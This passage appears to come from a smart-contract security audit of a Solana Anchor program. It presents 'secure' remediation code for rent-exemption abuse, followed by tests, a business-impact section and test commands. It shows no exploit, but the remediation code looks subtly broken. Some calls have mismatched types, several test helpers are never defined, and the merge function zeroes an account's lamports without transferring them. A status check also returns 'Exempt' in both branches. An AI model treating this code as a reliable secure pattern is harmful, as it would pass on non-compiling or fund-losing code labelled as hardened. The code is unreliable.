        pub account_flags: AccountFlags,
    }

    #[derive(AnchorSerialize, AnchorDeserialize, Clone, Debug)]
    pub struct AccountFlags {
        pub is_temporary: bool,
        pub expiry_timestamp: Option<i64>,
        pub size_locked: bool,
        pub rent_locked: bool,
        pub state_verified: bool,
    }

    // Comprehensive rent validation
    pub fn validate_rent_exemption(
        account_info: &AccountInfo,
        expected_data_size: usize,
        rent: &Rent
    ) -> Result<RentValidation> {
        // Validate account size limits
        require!(
            expected_data_size <= MAX_ACCOUNT_SIZE,
            ErrorCode::AccountSizeExceedsLimit
        );

        // Calculate required rent exemption
        let required_lamports = rent.minimum_balance(expected_data_size);
        let current_lamports = account_info.lamports();

        // Determine exemption status with buffer
        let exemption_status = if current_lamports >= required_lamports + MINIMUM_RENT_EXEMPTION_BUFFER {
            ExemptionStatus::Exempt
        } else if current_lamports >= required_lamports {
            ExemptionStatus::Exempt // Just barely exempt
        } else {
            ExemptionStatus::Insufficient
        };

        // Generate validation signature
        let validation_data = [
            &expected_data_size.to_le_bytes(),
            &required_lamports.to_le_bytes(),
            &current_lamports.to_le_bytes(),
        ].concat();

        let validation_signature = solana_program::hash::hash(&validation_data).to_bytes();

        Ok(RentValidation {
            account_size: expected_data_size,
            required_lamports,
            current_lamports,
            exemption_status,
            validation_timestamp: Clock::get()?.unix_timestamp,
            validation_signature,
        })
    }

    // Secure account creation with rent validation
    pub fn create_account_with_rent_validation(
        ctx: Context<CreateAccountWithRentValidation>,
        account_size: u64,
        initial_data: Vec<u8>
    ) -> Result<()> {
        let account = &mut ctx.accounts.account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Validate input parameters
        require!(
            account_size <= MAX_ACCOUNT_SIZE as u64,
            ErrorCode::AccountSizeExceedsLimit
        );

        require!(
            initial_data.len() == account_size as usize,
            ErrorCode::DataSizeMismatch
        );

        // Validate rent exemption
        let rent_validation = validate_rent_exemption(
            account.to_account_info(),
            account_size as usize,
            &rent
        )?;

        require!(
            rent_validation.exemption_status == ExemptionStatus::Exempt,
            ErrorCode::InsufficientRentExemption
        );

        // Initialize account with validated data
        account.owner = ctx.accounts.authority.key();
        account.data = initial_data;
        account.rent_validation = rent_validation;
        account.creation_timestamp = clock.unix_timestamp;
        account.last_rent_check = clock.unix_timestamp;
        account.rent_exemption_verified = true;
        account.account_flags = AccountFlags {
            is_temporary: false,
            expiry_timestamp: None,
            size_locked: false,
            rent_locked: false,
            state_verified: true,
        };

        emit!(SecureAccountCreated {
            account: account.key(),
            owner: account.owner,
            size: account_size,
            rent_paid: rent_validation.required_lamports,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure account resizing with rent validation
    pub fn resize_account_with_validation(
        ctx: Context<ResizeAccountWithValidation>,
        new_size: u64
    ) -> Result<()> {
        let account = &mut ctx.accounts.account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Validate resize permissions
        require!(
            account.owner == ctx.accounts.authority.key(),
            ErrorCode::UnauthorizedResize
        );

        require!(
            !account.account_flags.size_locked,
            ErrorCode::AccountSizeLocked
        );

        // Validate new size
        require!(
            new_size <= MAX_ACCOUNT_SIZE as u64,
            ErrorCode::NewSizeExceedsLimit
        );

        let old_size = account.data.len();
        let new_size_usize = new_size as usize;

        // Calculate rent requirements for new size
        let old_rent_requirement = rent.minimum_balance(old_size);
        let new_rent_requirement = rent.minimum_balance(new_size_usize);

        if new_rent_requirement > old_rent_requirement {
            // Size increase - validate additional rent
            let additional_rent_needed = new_rent_requirement - old_rent_requirement;
            let current_lamports = account.to_account_info().lamports();

            require!(
                current_lamports >= new_rent_requirement + MINIMUM_RENT_EXEMPTION_BUFFER,
                ErrorCode::InsufficientRentForResize
            );

            msg!("Resize requires additional {} lamports rent", additional_rent_needed);
        }

        // Perform secure resize
        if new_size_usize > old_size {
            // Expanding - add zeros
            account.data.resize(new_size_usize, 0);
        } else if new_size_usize < old_size {
            // Shrinking - truncate
            account.data.truncate(new_size_usize);
        }

        // Update rent validation
        account.rent_validation = validate_rent_exemption(
            account.to_account_info(),
            new_size_usize,
            &rent
        )?;

        account.last_rent_check = clock.unix_timestamp;

        emit!(AccountResized {
            account: account.key(),
            old_size: old_size as u64,
            new_size,
            rent_requirement: new_rent_requirement,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure temporary account creation with expiry enforcement
    pub fn create_temporary_account_secure(
        ctx: Context<CreateTemporaryAccountSecure>,
        duration: i64,
        temp_data: Vec<u8>
    ) -> Result<()> {
        let temp_account = &mut ctx.accounts.temp_account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Validate duration limits
        require!(
            duration > 0 && duration <= TEMPORARY_ACCOUNT_MAX_DURATION,
            ErrorCode::InvalidTemporaryDuration
        );

        // Validate temporary account has proper rent exemption
        let rent_validation = validate_rent_exemption(
            temp_account.to_account_info(),
            temp_data.len(),
            &rent
        )?;

        require!(
            rent_validation.exemption_status == ExemptionStatus::Exempt,
            ErrorCode::TemporaryAccountInsufficientRent
        );

        // Initialize temporary account
        let expiry_timestamp = clock.unix_timestamp + duration;

        temp_account.owner = ctx.accounts.authority.key();
        temp_account.data = temp_data;
        temp_account.rent_validation = rent_validation;
        temp_account.creation_timestamp = clock.unix_timestamp;
        temp_account.last_rent_check = clock.unix_timestamp;
        temp_account.rent_exemption_verified = true;
        temp_account.account_flags = AccountFlags {
            is_temporary: true,
            expiry_timestamp: Some(expiry_timestamp),
            size_locked: true, // Temporary accounts cannot resize
            rent_locked: true, // Rent requirements locked
            state_verified: true,
        };

        emit!(TemporaryAccountCreated {
            account: temp_account.key(),
            owner: temp_account.owner,
            size: temp_account.data.len() as u64,
            expiry: expiry_timestamp,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure account inheritance with proper rent validation
    pub fn inherit_account_data_secure(
        ctx: Context<InheritAccountDataSecure>,
        max_inherited_size: u64
    ) -> Result<()> {
        let target_account = &mut ctx.accounts.target_account;
        let source_account = &ctx.accounts.source_account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Validate inheritance permissions
        require!(
            target_account.owner == ctx.accounts.authority.key(),
            ErrorCode::UnauthorizedInheritance
        );

        require!(
            source_account.rent_exemption_verified,
            ErrorCode::SourceAccountNotVerified
        );

        // Validate inherited data size limits
        let inherited_data_size = source_account.data.len().min(max_inherited_size as usize);

        require!(
            inherited_data_size <= MAX_ACCOUNT_SIZE,
            ErrorCode::InheritedDataTooLarge
        );

        // Validate target account can afford inherited data
        let rent_validation = validate_rent_exemption(
            target_account.to_account_info(),
            inherited_data_size,
            &rent
        )?;

        require!(
            rent_validation.exemption_status == ExemptionStatus::Exempt,
            ErrorCode::InsufficientRentForInheritance
        );

        // Perform secure inheritance
        target_account.data = source_account.data[..inherited_data_size].to_vec();
        target_account.rent_validation = rent_validation;
        target_account.last_rent_check = clock.unix_timestamp;

        // DO NOT inherit exemption status - always validate independently
        target_account.rent_exemption_verified = true;

        emit!(AccountDataInherited {
            target_account: target_account.key(),
            source_account: source_account.key(),
            inherited_size: inherited_data_size as u64,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Secure account merging with rent validation
    pub fn merge_accounts_secure(
        ctx: Context<MergeAccountsSecure>,
        max_combined_size: u64
    ) -> Result<()> {
        let primary_account = &mut ctx.accounts.primary_account;
        let secondary_account = &mut ctx.accounts.secondary_account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Validate merge permissions
        require!(
            primary_account.owner == ctx.accounts.authority.key() &&
            secondary_account.owner == ctx.accounts.authority.key(),
            ErrorCode::UnauthorizedMerge
        );

        // Calculate combined size
        let primary_size = primary_account.data.len();
        let secondary_size = secondary_account.data.len();
        let combined_size = primary_size + secondary_size;

        require!(
            combined_size <= max_combined_size as usize &&
            combined_size <= MAX_ACCOUNT_SIZE,
            ErrorCode::MergedAccountTooLarge
        );

        // Validate combined account rent exemption
        let combined_lamports = primary_account.to_account_info().lamports() +
                              secondary_account.to_account_info().lamports();

        let required_rent = rent.minimum_balance(combined_size);

        require!(
            combined_lamports >= required_rent + MINIMUM_RENT_EXEMPTION_BUFFER,
            ErrorCode::InsufficientRentForMerge
        );

        // Perform secure merge
        primary_account.data.extend_from_slice(&secondary_account.data);

        // Update rent validation for primary account
        primary_account.rent_validation = validate_rent_exemption(
            primary_account.to_account_info(),
            combined_size,
            &rent
        )?;

        primary_account.last_rent_check = clock.unix_timestamp;

        // Clear secondary account
        secondary_account.data.clear();
        **secondary_account.to_account_info().try_borrow_mut_lamports()? = 0;

        emit!(AccountsMerged {
            primary_account: primary_account.key(),
            secondary_account: secondary_account.key(),
            combined_size: combined_size as u64,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }

    // Periodic rent validation for existing accounts
    pub fn validate_existing_account_rent(
        ctx: Context<ValidateExistingAccountRent>
    ) -> Result<()> {
        let account = &mut ctx.accounts.account;
        let rent = Rent::get()?;
        let clock = Clock::get()?;

        // Perform fresh rent validation
        let current_validation = validate_rent_exemption(
            account.to_account_info(),
            account.data.len(),
            &rent
        )?;

        // Check if account has become under-funded
        require!(
            current_validation.exemption_status != ExemptionStatus::Insufficient,
            ErrorCode::AccountBecameUnderFunded
        );

        // Update validation
        account.rent_validation = current_validation;
        account.last_rent_check = clock.unix_timestamp;

        // Verify temporary account expiry
        if account.account_flags.is_temporary {
            if let Some(expiry) = account.account_flags.expiry_timestamp {
                if clock.unix_timestamp >= expiry {
                    return Err(ErrorCode::TemporaryAccountExpired.into());
                }
            }
        }

        Ok(())
    }

    // Clean up expired temporary accounts
    pub fn cleanup_expired_temporary_account(
        ctx: Context<CleanupExpiredTemporaryAccount>
    ) -> Result<()> {
        let temp_account = &mut ctx.accounts.temp_account;
        let clock = Clock::get()?;

        // Verify account is temporary
        require!(
            temp_account.account_flags.is_temporary,
            ErrorCode::AccountNotTemporary
        );

        // Verify account has expired
        if let Some(expiry) = temp_account.account_flags.expiry_timestamp {
            require!(
                clock.unix_timestamp >= expiry,
                ErrorCode::AccountNotExpired
            );
        } else {
            return Err(ErrorCode::NoExpiryTimestamp.into());
        }

        // Clear account data and transfer remaining lamports
        temp_account.data.clear();
        let remaining_lamports = temp_account.to_account_info().lamports();

        **temp_account.to_account_info().try_borrow_mut_lamports()? = 0;
        **ctx.accounts.rent_collector.try_borrow_mut_lamports()? += remaining_lamports;

        emit!(TemporaryAccountCleaned {
            account: temp_account.key(),
            rent_collected: remaining_lamports,
            timestamp: clock.unix_timestamp,
        });

        Ok(())
    }
}

// Enhanced instruction contexts
#[derive(Accounts)]
#[instruction(account_size: u64, initial_data: Vec<u8>)]
pub struct CreateAccountWithRentValidation<'info> {
    #[account(
        init,
        payer = authority,
        space = 8 + SecureRentTrackedAccount::INIT_SPACE,
        constraint = account_size <= secure_rent_management::MAX_ACCOUNT_SIZE as u64 @ ErrorCode::AccountSizeExceedsLimit
    )]
    pub account: Account<'info, secure_rent_management::SecureRentTrackedAccount>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub system_program: Program<'info, System>,
    pub rent: Sysvar<'info, Rent>,
    pub clock: Sysvar<'info, Clock>,
}

#[derive(Accounts)]
#[instruction(new_size: u64)]
pub struct ResizeAccountWithValidation<'info> {
    #[account(
        mut,
        constraint = account.owner == authority.key() @ ErrorCode::UnauthorizedResize,
        constraint = !account.account_flags.size_locked @ ErrorCode::AccountSizeLocked
    )]
    pub account: Account<'info, secure_rent_management::SecureRentTrackedAccount>,

    #[account(mut)]
    pub authority: Signer<'info>,

    pub rent: Sysvar<'info, Rent>,
    pub clock: Sysvar<'info, Clock>,
}

// Events for monitoring
#[event]
pub struct SecureAccountCreated {
    pub account: Pubkey,
    pub owner: Pubkey,
    pub size: u64,
    pub rent_paid: u64,
    pub timestamp: i64,
}

#[event]
pub struct AccountResized {
    pub account: Pubkey,
    pub old_size: u64,
    pub new_size: u64,
    pub rent_requirement: u64,
    pub timestamp: i64,
}

#[event]
pub struct TemporaryAccountCreated {
    pub account: Pubkey,
    pub owner: Pubkey,
    pub size: u64,
    pub expiry: i64,
    pub timestamp: i64,
}

#[event]
pub struct TemporaryAccountCleaned {
    pub account: Pubkey,
    pub rent_collected: u64,
    pub timestamp: i64,
}

// Enhanced error codes
#[error_code]
pub enum ErrorCode {
    #[msg("Account size exceeds maximum limit")]
    AccountSizeExceedsLimit,

    #[msg("Data size does not match specified account size")]
    DataSizeMismatch,

    #[msg("Insufficient lamports for rent exemption")]
    InsufficientRentExemption,

    #[msg("Unauthorized account resize")]
    UnauthorizedResize,

    #[msg("Account size is locked")]
    AccountSizeLocked,

    #[msg("New size exceeds maximum limit")]
    NewSizeExceedsLimit,

    #[msg("Insufficient rent for resize operation")]
    InsufficientRentForResize,

    #[msg("Invalid temporary account duration")]
    InvalidTemporaryDuration,

    #[msg("Temporary account has insufficient rent")]
    TemporaryAccountInsufficientRent,

    #[msg("Unauthorized inheritance operation")]
    UnauthorizedInheritance,

    #[msg("Source account not verified")]
    SourceAccountNotVerified,

    #[msg("Inherited data too large")]
    InheritedDataTooLarge,

    #[msg("Insufficient rent for inheritance")]
    InsufficientRentForInheritance,

    #[msg("Unauthorized merge operation")]
    UnauthorizedMerge,

    #[msg("Merged account would be too large")]
    MergedAccountTooLarge,

    #[msg("Insufficient rent for merge operation")]
    InsufficientRentForMerge,

    #[msg("Account has become under-funded")]
    AccountBecameUnderFunded,

    #[msg("Temporary account has expired")]
    TemporaryAccountExpired,

    #[msg("Account is not temporary")]
    AccountNotTemporary,

    #[msg("Account has not expired")]
    AccountNotExpired,

    #[msg("No expiry timestamp set")]
    NoExpiryTimestamp,
}
```

### Testing Requirements

```rust
#[cfg(test)]
mod secure_rent_tests {
    use super::*;
    use solana_program_test::*;
    use solana_sdk::{
        signature::{Keypair, Signer},
        transaction::Transaction,
    };

    #[tokio::test]
    async fn test_rent_exemption_validation() {
        // Test that accounts must have proper rent exemption
        let rent = Rent::default();
        let account_size = 1000;
        let required_rent = rent.minimum_balance(account_size);

        // Test sufficient rent
        let sufficient_account = create_test_account_with_lamports(
            required_rent + secure_rent_management::MINIMUM_RENT_EXEMPTION_BUFFER
        );
        let validation = secure_rent_management::validate_rent_exemption(
            &sufficient_account,
            account_size,
            &rent
        ).unwrap();
        assert_eq!(validation.exemption_status, secure_rent_management::ExemptionStatus::Exempt);

        // Test insufficient rent
        let insufficient_account = create_test_account_with_lamports(required_rent - 1);
        let validation = secure_rent_management::validate_rent_exemption(
            &insufficient_account,
            account_size,
            &rent
        ).unwrap();
        assert_eq!(validation.exemption_status, secure_rent_management::ExemptionStatus::Insufficient);
    }

    #[tokio::test]
    async fn test_account_size_limits() {
        // Test that accounts cannot exceed maximum size
        let oversized_data = vec![0u8; secure_rent_management::MAX_ACCOUNT_SIZE + 1];

        let result = create_test_account_with_data(oversized_data);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_temporary_account_expiry() {
        // Test that temporary accounts respect expiry limits
        let excessive_duration = secure_rent_management::TEMPORARY_ACCOUNT_MAX_DURATION + 1;

        let result = create_test_temporary_account(excessive_duration, vec![0u8; 100]);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_rent_validation_for_resize() {
        // Test that resizing requires proper rent validation
        let mut account = create_test_rent_tracked_account(100); // 100 bytes
        let new_size = 1000u64; // 1000 bytes

        // Should fail if account doesn't have enough lamports for new size
        let result = resize_account_with_insufficient_rent(&mut account, new_size);
        assert!(result.is_err());

        // Should succeed if account has sufficient lamports
        fund_account_for_size(&mut account, new_size as usize);
        let result = resize_account_with_sufficient_rent(&mut account, new_size);
        assert!(result.is_ok());
    }

    #[tokio::test]
    async fn test_inheritance_rent_validation() {
        // Test that inheritance validates rent for inherited data
        let source_account = create_test_rent_tracked_account(5000); // 5KB
        let target_account = create_test_rent_tracked_account(100);  // 100 bytes

        // Should fail if target doesn't have enough rent for inheritance
        let result = inherit_account_data_insufficient_rent(&target_account, &source_account);
        assert!(result.is_err());
    }

    #[tokio::test]
    async fn test_merge_rent_validation() {
        // Test that merging validates combined rent requirements
        let primary_account = create_test_rent_tracked_account(1000);   // 1KB
        let secondary_account = create_test_rent_tracked_account(2000); // 2KB

        // Should validate that combined account has sufficient rent
        let result = merge_accounts_with_validation(&primary_account, &secondary_account);
        // Result depends on total lamports vs required rent for 3KB
    }

    // Helper functions for tests
    fn create_test_account_with_lamports(lamports: u64) -> AccountInfo {
        // Create mock account with specified lamports
        AccountInfo::new(
            &Pubkey::new_unique(),
            false,
            false,
            &mut lamports.clone(),
            &mut [],
            &Pubkey::new_unique(),
            false,
            0,
        )
    }

    fn create_test_rent_tracked_account(size: usize) -> secure_rent_management::SecureRentTrackedAccount {
        let rent = Rent::default();
        let required_rent = rent.minimum_balance(size);

        secure_rent_management::SecureRentTrackedAccount {
            owner: Pubkey::new_unique(),
            data: vec![0u8; size],
            rent_validation: secure_rent_management::RentValidation {
                account_size: size,
                required_lamports: required_rent,
                current_lamports: required_rent + secure_rent_management::MINIMUM_RENT_EXEMPTION_BUFFER,
                exemption_status: secure_rent_management::ExemptionStatus::Exempt,
                validation_timestamp: 0,
                validation_signature: [0u8; 32],
            },
            creation_timestamp: 0,
            last_rent_check: 0,
            rent_exemption_verified: true,
            account_flags: secure_rent_management::AccountFlags {
                is_temporary: false,
                expiry_timestamp: None,
                size_locked: false,
                rent_locked: false,
                state_verified: true,
            },
        }
    }
}
```

## Business Impact

### Financial Risk
- **Network Resource Abuse**: Unlimited storage consumption without payment
- **Economic Model Breakdown**: Rent exemption system becomes ineffective
- **Infrastructure Cost**: Network bears storage costs that should be paid by users

### Operational Impact
- **Storage Exhaustion**: Network storage can be consumed rapidly by attackers
- **Performance Degradation**: Excessive account creation impacts network performance
- **Economic Incentive Failure**: Legitimate users pay rent while attackers don't

### User Impact
- **Network Congestion**: Legitimate transactions slowed by resource abuse
- **Higher Costs**: Legitimate users may face higher fees due to resource scarcity
- **Service Degradation**: Protocol performance degrades under storage abuse

## Recommended Testing

### Rent Security Tests
```bash
# Rent exemption validation tests
cargo test test_rent_exemption_validation --release
cargo test test_account_size_limits --release
cargo test test_temporary_account_expiry --release

# Rent manipulation prevention tests
cargo test test_rent_validation_for_resize --release
cargo test test_inheritance_rent_validation --release
cargo test test_merge_rent_validation --release

# Economic abuse prevention tests
cargo test test_mass_creation_prevention --release
cargo test test_size_manipulation_prevention --release
```

### Security Validation
```bash
# Comprehensive rent security testing
./scripts/test_rent_security.sh
./scripts/audit_economic_model.sh
./scripts/validate_storage_limits.sh
```

This vulnerability represents a critical economic attack that can undermine Solana's storage economics and enable unlimited resource consumption without proper payment, potentially destabilizing the entire network's economic model.